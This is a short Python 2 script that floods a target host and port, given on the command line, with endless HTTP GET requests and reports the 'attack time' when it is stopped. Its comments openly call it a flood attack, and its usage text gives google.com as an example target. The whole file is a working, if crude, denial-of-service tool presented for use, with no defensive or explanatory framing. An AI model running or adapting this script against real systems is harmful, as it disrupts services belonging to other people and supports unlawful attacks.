import requests, sys, time, platform, os
from os import _exit
counter = 0
init = time.time()
def cls():
    if platform.system() == 'Windows':
        os.system('cls')
    else:
        os.system('clear')
def info(): # Show the user time expended on flood attack
    end = time.time()
    total = int(end - init)
    print '\n\n[*] Attack time: %i seconds' % total
cls()
if len(sys.argv) >= 3: # verify argumentes
    host = sys.argv[1]
    port = sys.argv[2]
    try:
        while 1: # start the flood
            counter += 1
            requests.get('http://'+host+':'+port) # >>> send request to target
            sys.stdout.write('\r[+] Sending request '+str(counter)+' to '+host+':'+port)
    except KeyboardInterrupt:
        info()
        sys.exit()
        _exit(0)

else: # print correct usage
    print '###############################\nUsage: %s <target> <port>' % (sys.argv[0].split("\\"))[::-1][0]
    print 'Ex: %s google.com 80\n###############################' % (sys.argv[0].split("\\"))[::-1][0]
    exit()